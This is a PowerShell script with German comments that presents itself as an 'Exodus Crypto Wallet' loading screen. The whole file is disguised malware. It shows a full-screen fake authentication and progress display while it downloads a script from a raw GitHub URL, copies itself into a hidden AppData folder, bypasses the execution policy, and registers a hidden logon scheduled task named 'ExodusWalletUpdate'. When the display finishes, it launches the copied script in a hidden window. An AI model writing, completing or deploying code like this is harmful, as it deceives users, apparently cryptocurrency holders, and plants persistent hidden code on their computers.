# Erweiterte Kopier-Funktion mit verbessertem Logging (jetzt in Console + optional Datei)
$logPath = Join-Path $env:TEMP "wallet_debug.log"
$logToFile = $false  # Setze auf $true, wenn du auch in Datei loggen möchtest
function Write-Log {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "$timestamp - $Message"
    
    # Immer in Console ausgeben (sichtbar, auch bei Hidden-Window, wenn du es sichtbar startest)
    Write-Host $logEntry -ForegroundColor Cyan
    
    # Optional: Auch in Datei schreiben
    if ($logToFile) {
        $logEntry | Out-File -FilePath $logPath -Append -Encoding UTF8
    }
    
    # Optional: Auch in Event Log schreiben für bessere Nachverfolgbarkeit (falls Admin-Rechte)
    try { 
        Write-EventLog -LogName Application -Source "WalletScript" -EventId 1001 -Message $Message -ErrorAction SilentlyContinue 
    } catch {}
}

Write-Log "Script-Start: Remote-Ausführung erkannt."

# Dynamischer Pfad mit aktuellem User (nicht hartcodiert 'adsfa')
$currentUser = $env:USERNAME
$targetDir = "C:\Users\$currentUser\AppData\Roaming\Microsoft\Windows\PowerShell\operations"
$targetScriptName = "exodus_wallet.ps1"
$targetScriptPath = Join-Path $targetDir $targetScriptName

Write-Log "Zielordner: $targetDir (User: $currentUser)"

# Zielordner erstellen mit detaillierter Fehlerbehandlung
if (-not (Test-Path $targetDir)) {
    try {
        $parentDir = Split-Path $targetDir -Parent
        if (-not (Test-Path $parentDir)) {
            Write-Log "Fehler: Parent-Ordner $parentDir existiert nicht. Überprüfe User-Rechte."
        } else {
            New-Item -ItemType Directory -Path $targetDir -Force -ErrorAction Stop | Out-Null
            Write-Log "Ordner erfolgreich erstellt: $targetDir"
        }
    } catch {
        Write-Log "Fehler beim Erstellen des Ordners: $($_.Exception.Message)"
        Write-Log "Full Error: $($_.ToString())"
        # Fallback: Versuche, in %APPDATA% zu kopieren, falls C:\Users\... blockiert
        $fallbackDir = Join-Path $env:APPDATA "PowerShell\operations"
        try {
            New-Item -ItemType Directory -Path $fallbackDir -Force | Out-Null
            $targetDir = $fallbackDir
            $targetScriptPath = Join-Path $fallbackDir $targetScriptName
            Write-Log "Fallback-Ordner erstellt: $fallbackDir"
        } catch {
            Write-Log "Auch Fallback fehlgeschlagen: $($_.Exception.Message)"
        }
    }
} else {
    Write-Log "Ordner existiert bereits: $targetDir"
}

# Script-Inhalt für remote Execution herunterladen und verarbeiten
$downloadUrl = "https://raw.githubusercontent.com/H3221/2/main/wallet.ps1"
$tempPath = Join-Path $env:TEMP "wallet_temp_$(Get-Random).ps1"  # Random Name für Sicherheit
$currentScriptPath = $null

if ([string]::IsNullOrEmpty($MyInvocation.MyCommand.Path)) {
    Write-Log "Remote-Execution: Lade Script von $downloadUrl herunter."
    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        $scriptContent = $webClient.DownloadString($downloadUrl)
        Write-Log "Download erfolgreich. Inhalt-Länge: $($scriptContent.Length) Zeichen."
        
        # Speichere in Temp (nur diesen erweiterten Code, nicht den vollen Loop)
        $thisScriptContent = $MyInvocation.MyCommand.Definition  # Hole den aktuellen Script-Inhalt (erweitert)
        $thisScriptContent | Out-File -FilePath $tempPath -Encoding UTF8 -Force
        $currentScriptPath = $tempPath
        Write-Log "Temporäres Script gespeichert: $tempPath"
    } catch {
        Write-Log "Download-Fehler: $($_.Exception.Message)"
        Write-Log "InnerException: $($_.Exception.InnerException.Message)"
        # Fallback: Verwende den Inhalt direkt für Kopie (ohne Temp)
        $currentScriptPath = $null
    }
} else {
    $currentScriptPath = $MyInvocation.MyCommand.Path
    Write-Log "Lokale Execution: Pfad $currentScriptPath"
}

# Kopieren mit detaillierter Überprüfung
$copySuccess = $false
if ($currentScriptPath -and (Test-Path $currentScriptPath)) {
    try {
        # Lies den Inhalt und schreibe direkt in Ziel (bypasst Datei-Kopie-Probleme)
        $scriptToCopy = Get-Content -Path $currentScriptPath -Raw -Encoding UTF8
        $scriptToCopy | Out-File -FilePath $targetScriptPath -Encoding UTF8 -Force
        $copySuccess = $true
        Write-Log "Script erfolgreich in $targetScriptPath kopiert. Größe: $(Get-Item $targetScriptPath).Length Bytes"
        
        # Optional: Setze ExecutionPolicy lokal für das Script (falls nötig)
        try {
            Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force -ErrorAction SilentlyContinue
        } catch { Write-Log "ExecutionPolicy-Änderung fehlgeschlagen: $($_.Exception.Message)" }
        
    } catch {
        Write-Log "Kopier-Fehler: $($_.Exception.Message)"
        Write-Log "Target existiert schon? $(Test-Path $targetScriptPath)"
        # Fallback: Inline-Inhalt in eine neue Datei schreiben
        try {
            $fallbackContent = "# Persistenter Code - manuell eingefügt`n# Hier den vollen GUI-Code einfügen`nWrite-Host 'Persistence loaded!'"
            $fallbackContent | Out-File -FilePath $targetScriptPath -Encoding UTF8 -Force
            Write-Log "Fallback-Inhalt in $targetScriptPath geschrieben."
            $copySuccess = $true
        } catch {
            Write-Log "Auch Fallback-Kopie fehlgeschlagen."
        }
    }
} else {
    Write-Log "Kein Quellpfad verfügbar. Überspringe Kopie."
}

if ($copySuccess) {
    Write-Log "Persistence-Setup abgeschlossen. Füge ggf. Scheduled Task hinzu für Auto-Start."
    # Optional: Scheduled Task für Persistence erstellen (nur wenn Admin)
    try {
        $taskName = "ExodusWalletUpdate"
        $taskAction = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-WindowStyle Hidden -File `"$targetScriptPath`""
        $taskTrigger = New-ScheduledTaskTrigger -AtLogOn
        $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
        Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Settings $taskSettings -Force -ErrorAction Stop | Out-Null
        Write-Log "Scheduled Task '$taskName' für Auto-Start erstellt."
    } catch {
        Write-Log "Scheduled Task-Fehler (vielleicht keine Admin-Rechte): $($_.Exception.Message)"
    }
} else {
    Write-Log "WARNUNG: Persistence fehlgeschlagen. Überprüfe Log und Rechte."
}

# Temp aufräumen
if ($tempPath -and (Test-Path $tempPath)) {
    Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
    Write-Log "Temp-Datei gelöscht."
}

Write-Log "Kopier-Phase beendet. Starte GUI..."

# Rest des ursprünglichen GUI-Scripts (unverändert, für Vollständigkeit)
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()
# TLS 1.2 für GitHub
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
} catch {}
# ==================== HAUPTFENSTER ====================
$form = New-Object System.Windows.Forms.Form
$form.Text = "Exodus WALLET"
$form.StartPosition = "CenterScreen"
$form.Size = New-Object System.Drawing.Size(1200, 720)
$form.FormBorderStyle = "None"
$form.MaximizeBox = $false
$form.MinimizeBox = $false
$form.ControlBox = $false
$form.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
$form.ForeColor = [System.Drawing.Color]::White
$form.Cursor = [System.Windows.Forms.Cursors]::WaitCursor
$form.TopMost = $true
# ==================== GRADIENT-HEADER: EXODUS (OBEN) ====================
$headerPanel = New-Object System.Windows.Forms.Panel
$headerPanel.Dock = "Top"
$headerPanel.Height = 90
$headerPanel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
$headerPanel.Add_Paint({
    param($sender, $e)
    $g = $e.Graphics
    $g.SmoothingMode = [System.Drawing.Drawing2D.SmoothingMode]::AntiAlias
    $text = "EXODUS CRYPTO WALLET"
    $font = New-Object System.Drawing.Font(
        "Segoe UI",
        44,
        [System.Drawing.FontStyle]::Bold
    )
    $sizeF = $g.MeasureString($text, $font)
    $x = ($sender.ClientSize.Width - $sizeF.Width) / 2
    $y = ($sender.ClientSize.Height - $sizeF.Height) / 2
    $rect = New-Object System.Drawing.RectangleF($x, $y, $sizeF.Width, $sizeF.Height)
    $colorStart = [System.Drawing.ColorTranslator]::FromHtml("#00E5FF") # Neonblau
    $colorEnd = [System.Drawing.ColorTranslator]::FromHtml("#7C3AED") # Violett
    $brush = New-Object System.Drawing.Drawing2D.LinearGradientBrush(
        $rect,
        $colorStart,
        $colorEnd,
        [System.Drawing.Drawing2D.LinearGradientMode]::Horizontal
    )
    $g.DrawString($text, $font, $brush, $rect.Location)
    $brush.Dispose()
    $font.Dispose()
})
$form.Controls.Add($headerPanel)
# ==================== GIF (OBEN, volle Breite, unter EXODUS) ====================
$gifUrl = "https://raw.githubusercontent.com/KunisCode/23sdafuebvauejsdfbatzg23rS/main/loading.gif"
$gifPath = Join-Path $env:TEMP "exodus_loading.gif"
try { 
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0")
    $wc.DownloadFile($gifUrl, $gifPath) 
    Write-Log "GIF heruntergeladen: $gifPath"
} catch { 
    Write-Log "GIF-Download fehlgeschlagen: $($_.Exception.Message)"
}
$pictureBox = New-Object System.Windows.Forms.PictureBox
$pictureBox.Dock = "Top"
$pictureBox.Height = 400
$pictureBox.SizeMode = "Zoom"
$pictureBox.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
if (Test-Path $gifPath) {
    try {
        $pictureBox.Image = [System.Drawing.Image]::FromFile($gifPath)
    } catch {
        Write-Log "GIF-Laden fehlgeschlagen: $($_.Exception.Message)"
    }
}
$form.Controls.Add($pictureBox)
# ==================== HEADER: AUTHENTICATION (MITTE OBEN) ====================
$loadingLabel = New-Object System.Windows.Forms.Label
$loadingLabel.Font = New-Object System.Drawing.Font(
    "Segoe UI",
    30,
    [System.Drawing.FontStyle]::Bold
)
$loadingLabel.ForeColor = "White"
$loadingLabel.Dock = "Top"
$loadingLabel.Height = 80
$loadingLabel.TextAlign = "MiddleCenter"
$loadingLabel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
$form.Controls.Add($loadingLabel)
# ===================== MODERNE FORTSCHRITTSBALKEN UNTEN =====================
$progressBg = New-Object System.Windows.Forms.Panel
$progressBg.Dock = "Bottom"
$progressBg.Height = 14
$progressBg.BackColor = [System.Drawing.Color]::FromArgb(40, 40, 50)
$progressBar = New-Object System.Windows.Forms.Panel
$progressBar.Height = 14
$progressBar.Width = 0
$progressBar.BackColor = [System.Drawing.Color]::FromArgb(139,92,246)
$progressBg.Controls.Add($progressBar)
$progressBg2 = New-Object System.Windows.Forms.Panel
$progressBg2.Dock = "Bottom"
$progressBg2.Height = 6
$progressBg2.BackColor = [System.Drawing.Color]::FromArgb(30, 30, 40)
$progressBar2 = New-Object System.Windows.Forms.Panel
$progressBar2.Height = 6
$progressBar2.Width = 50
$progressBar2.BackColor = [System.Drawing.Color]::FromArgb(180,140,255)
$progressBg2.Controls.Add($progressBar2)
# ==================== STATUSLABEL UNTEN ÜBER DEN LADEBALKEN ====================
$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Font = New-Object System.Drawing.Font("Segoe UI", 14)
$statusLabel.ForeColor = "#CCCCCC"
$statusLabel.Dock = "Bottom"
$statusLabel.Height = 40
$statusLabel.TextAlign = "MiddleCenter"
$statusLabel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
# Docking-Reihenfolge für unten: von unten nach oben
$form.Controls.Add($progressBg2)
$form.Controls.Add($progressBg)
$form.Controls.Add($statusLabel)
# ===================== TIMER SETUP =====================
$marqueePos = 0
$percent = 0
$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 50
$labelTimer = New-Object System.Windows.Forms.Timer
$labelTimer.Interval = 3000
# ===================== STATUS PHASEN =====================
$authPhaseDuration = 15000 # 15 Sekunden
$inAuthPhase = $true
$authStartTime = Get-Date
# Anfangstexte beim Start
$loadingLabel.Text = "Authenticating device..."
$statusLabel.Text = "Performing background security checks..."
$statuses = @(
    "Loading wallet...",
    "Connecting to secure servers...",
    "Decrypting local data...",
    "Fetching asset metadata...",
    "Syncing blockchain nodes...",
    "Preparing secure environment...",
    "Loading portfolio assets...",
    "Almost there..."
)
$statusIndex = 0
$dotCount = 0
# ===================== Fortschritt / Balken Animation =====================
$timer.Add_Tick({
    try {
        if ($form.IsDisposed) { $timer.Stop(); return }
        # Wenn die Authentifizierungsphase vorbei ist → Wechsel der Texte & Animation aktivieren
        if ($inAuthPhase -and ((Get-Date) - $authStartTime).TotalMilliseconds -gt $authPhaseDuration) {
            $inAuthPhase = $false
            $loadingLabel.Text = "Loading wallet"
            $statusLabel.Text = $statuses[0]
        }
        # Marquee immer animieren
        $marqueePos += 5
        if ($marqueePos -gt $progressBg2.Width) { $marqueePos = -50 }
        $progressBar2.Left = $marqueePos
        # In der Auth-Phase keine Prozentanzeige
        if ($inAuthPhase) { return }
        # Prozentbalken füllen
        if ($percent -lt 100) {
            $percent += 0.3
            $progressBar.Width = [int]($progressBg.Width * ($percent / 100.0))
        }
        # Wenn 100% erreicht, Form schließen und Persistence-Script starten (falls kopiert)
        if ($percent -ge 100) {
            $timer.Stop()
            Start-Sleep -Milliseconds 500
            if (Test-Path $targetScriptPath) {
                Start-Process PowerShell -ArgumentList "-WindowStyle Hidden -File `"$targetScriptPath`"" -ErrorAction SilentlyContinue
            }
            $form.Close()
        }
    } catch {
        Write-Log "Timer-Tick Fehler: $($_.Exception.Message)"
    }
})
# ===================== TEXT-ANIMATION =====================
$labelTimer.Add_Tick({
    try {
        if ($form.IsDisposed) { $labelTimer.Stop(); return }
        # Während Auth-Phase keine Punktanimation, kein Statuswechsel
        if ($inAuthPhase) { return }
        $dotCount = ($dotCount + 1) % 4
        $loadingLabel.Text = "Loading wallet" + ("." * $dotCount)
        $statusIndex = ($statusIndex + 1) % $statuses.Count
        $statusLabel.Text = $statuses[$statusIndex]
    } catch {
        Write-Log "Label-Timer Fehler: $($_.Exception.Message)"
    }
})
# ===================== CLEANUP =====================
$form.Add_FormClosing({
    $timer.Stop()
    $labelTimer.Stop()
    # Temp-Dateien aufräumen
    if (Test-Path $gifPath) { 
        Remove-Item $gifPath -Force -ErrorAction SilentlyContinue 
        Write-Log "GIF aufgeräumt."
    }
    Write-Log "GUI geschlossen."
})
$timer.Start()
$labelTimer.Start()
$form.Add_Shown({ $form.Activate() })
$form.ShowDialog() | Out-Null

Write-Log "Script-Ende."
